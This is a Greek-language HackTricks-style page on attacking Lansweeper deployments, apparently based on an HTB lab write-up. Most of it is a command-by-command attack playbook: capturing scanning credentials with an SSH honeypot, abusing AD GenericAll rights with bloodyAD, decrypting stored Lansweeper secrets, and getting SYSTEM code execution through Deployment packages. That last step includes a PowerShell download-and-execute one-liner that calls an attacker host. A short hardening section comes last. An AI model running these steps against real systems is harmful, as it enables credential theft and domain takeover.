# Abuse του Lansweeper: Credential Harvesting, Decryption Secrets και Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Το Lansweeper είναι μια πλατφόρμα discovery και inventory IT assets, η οποία συνήθως αναπτύσσεται σε Windows και ενσωματώνεται με το Active Directory. Τα credentials που έχουν ρυθμιστεί στο Lansweeper χρησιμοποιούνται από τους scanning engines του για authentication σε assets μέσω πρωτοκόλλων όπως SSH, SMB/WMI και WinRM. Οι λανθασμένες ρυθμίσεις συχνά επιτρέπουν:

- Interception credentials μέσω redirect ενός scanning target σε host ελεγχόμενο από τον attacker (honeypot)
- Abuse των AD ACLs που εκτίθενται από groups που σχετίζονται με το Lansweeper, για απόκτηση remote access
- On-host decryption των secrets που έχουν ρυθμιστεί στο Lansweeper (connection strings και stored scanning credentials)
- Code execution σε managed endpoints μέσω του Deployment feature (συχνά με εκτέλεση ως SYSTEM)

Αυτή η σελίδα συνοψίζει πρακτικά attacker workflows και commands για την εκμετάλλευση αυτών των συμπεριφορών κατά τη διάρκεια engagements.

## 1) Harvest scanning credentials μέσω honeypot (παράδειγμα SSH)

Ιδέα: δημιουργήστε ένα Scanning Target που δείχνει στο host σας και αντιστοιχίστε σε αυτό υπάρχοντα Scanning Credentials. Όταν εκτελεστεί το scan, το Lansweeper θα προσπαθήσει να κάνει authentication χρησιμοποιώντας αυτά τα credentials και το honeypot σας θα τα καταγράψει.<sup>[[1]](#references)</sup>

Επισκόπηση βημάτων (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (ή Single IP) = το VPN IP σας
- Ρυθμίστε το SSH port σε κάτι προσβάσιμο (π.χ. 2022 αν το 22 είναι blocked)
- Απενεργοποιήστε το schedule και σχεδιάστε να το triggerάρετε χειροκίνητα
- Scanning → Scanning Credentials → βεβαιωθείτε ότι υπάρχουν Linux/SSH creds· αντιστοιχίστε τα στο νέο target (ενεργοποιήστε τα όλα, ανάλογα με τις ανάγκες)
- Κάντε click στο “Scan now” στο target
- Εκτελέστε ένα SSH honeypot και ανακτήστε το username/password που χρησιμοποιήθηκε στην προσπάθεια authentication

Παράδειγμα με sshesame:<sup>[[2]](#references)</sup>
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Επικύρωση captured creds έναντι υπηρεσιών DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notes
- Λειτουργεί παρόμοια και για άλλα protocols, όταν μπορείτε να εξαναγκάσετε τον scanner να συνδεθεί στον listener σας (SMB/WinRM honeypots κ.λπ.). Το SSH είναι συχνά η απλούστερη επιλογή.
- Πολλοί scanners ταυτοποιούνται με διακριτά client banners (π.χ. RebexSSH) και θα επιχειρήσουν benign commands (uname, whoami κ.λπ.).

## 2) AD ACL abuse: αποκτήστε remote access προσθέτοντας τον εαυτό σας σε ένα app-admin group

Χρησιμοποιήστε το BloodHound για να απαριθμήσετε τα effective rights του compromised account. Ένα συχνό εύρημα είναι ένα scanner- ή app-specific group (π.χ. “Lansweeper Discovery”) που διαθέτει GenericAll πάνω σε ένα privileged group (π.χ. “Lansweeper Admins”). Αν το privileged group είναι επίσης μέλος του “Remote Management Users”, το WinRM γίνεται διαθέσιμο μόλις προσθέσουμε τον εαυτό μας.<sup>[[1]](#references)[[5]](#references)</sup>

Παραδείγματα συλλογής:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Εκμετάλλευση του GenericAll σε ομάδα με το BloodyAD (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Στη συνέχεια, αποκτήστε ένα interactive shell:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Συμβουλή: Οι λειτουργίες Kerberos είναι ευαίσθητες στον χρόνο. Αν συναντήσετε `KRB_AP_ERR_SKEW`, συγχρονιστείτε πρώτα με το DC:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Αποκρυπτογράφηση secrets που έχουν ρυθμιστεί από το Lansweeper

Στον Lansweeper server, το ASP.NET site συνήθως αποθηκεύει μια κρυπτογραφημένη connection string και ένα symmetric key που χρησιμοποιείται από την εφαρμογή. Με την κατάλληλη local access, μπορείτε να αποκρυπτογραφήσετε τη DB connection string και, στη συνέχεια, να εξαγάγετε τα αποθηκευμένα scanning credentials.<sup>[[1]](#references)</sup>

Τυπικές τοποθεσίες:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Χρησιμοποιήστε το SharpLansweeperDecrypt για να αυτοματοποιήσετε την αποκρυπτογράφηση και την εξαγωγή των αποθηκευμένων creds:<sup>[[3]](#references)</sup>
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
Το αναμενόμενο αποτέλεσμα περιλαμβάνει στοιχεία σύνδεσης στη DB και credentials σάρωσης σε plaintext, όπως λογαριασμούς Windows και Linux που χρησιμοποιούνται σε ολόκληρο το περιβάλλον. Αυτοί συχνά διαθέτουν αυξημένα τοπικά δικαιώματα σε domain hosts:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Χρησιμοποιήστε τα ανακτημένα Windows scanning creds για privileged access:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Ως μέλος των “Lansweeper Admins”, το web UI παρέχει πρόσβαση στις ενότητες Deployment και Configuration. Στην ενότητα Deployment → Deployment packages, μπορείτε να δημιουργήσετε packages που εκτελούν arbitrary commands στα assets που έχουν επιλεγεί ως στόχοι. Η εκτέλεση πραγματοποιείται από την υπηρεσία Lansweeper με υψηλά privileges, παρέχοντας code execution ως NT AUTHORITY\SYSTEM στο επιλεγμένο host.<sup>[[1]](#references)</sup>

Βήματα υψηλού επιπέδου:
- Δημιουργήστε ένα νέο Deployment package που εκτελεί ένα PowerShell ή cmd one-liner (reverse shell, add-user κ.λπ.).
- Επιλέξτε ως στόχο το επιθυμητό asset (π.χ. το DC/host όπου εκτελείται το Lansweeper) και κάντε κλικ στο Deploy/Run now.
- Κάντε catch το shell σας ως SYSTEM.

Παραδείγματα payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Οι ενέργειες Deployment είναι θορυβώδεις και αφήνουν logs στο Lansweeper και στα Windows event logs. Χρησιμοποιήστε τις με φειδώ.

## Ανίχνευση και hardening

- Περιορίστε ή καταργήστε τα anonymous SMB enumerations. Παρακολουθείτε για RID cycling και ανώμαλη πρόσβαση σε Lansweeper shares.
- Egress controls: αποκλείστε ή περιορίστε αυστηρά τα outbound SSH/SMB/WinRM από scanner hosts. Ειδοποιείτε για μη τυπικές θύρες (π.χ. 2022) και ασυνήθιστα client banners, όπως το Rebex.
- Προστατεύστε τα `Website\\web.config` και `Key\\Encryption.txt`. Externalize τα secrets σε vault και κάντε rotate όταν εκτεθούν. Εξετάστε service accounts με ελάχιστα privileges και gMSA όπου είναι εφικτό.
- AD monitoring: δημιουργήστε alerts για αλλαγές σε groups που σχετίζονται με το Lansweeper (π.χ. “Lansweeper Admins”, “Remote Management Users”) και για αλλαγές ACL που εκχωρούν GenericAll/Write membership σε privileged groups.
- Κάντε audit στις δημιουργίες/αλλαγές/εκτελέσεις Deployment packages· δημιουργήστε alerts για packages που κάνουν spawn τα cmd.exe/powershell.exe ή πραγματοποιούν απρόσμενες outbound connections.

## Σχετικά θέματα
- SMB/LSA/SAMR enumeration και RID cycling
- Kerberos password spraying και ζητήματα clock skew
- BloodHound path analysis σε application-admin groups
- Χρήση WinRM και lateral movement

## Αναφορές
- [1] [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
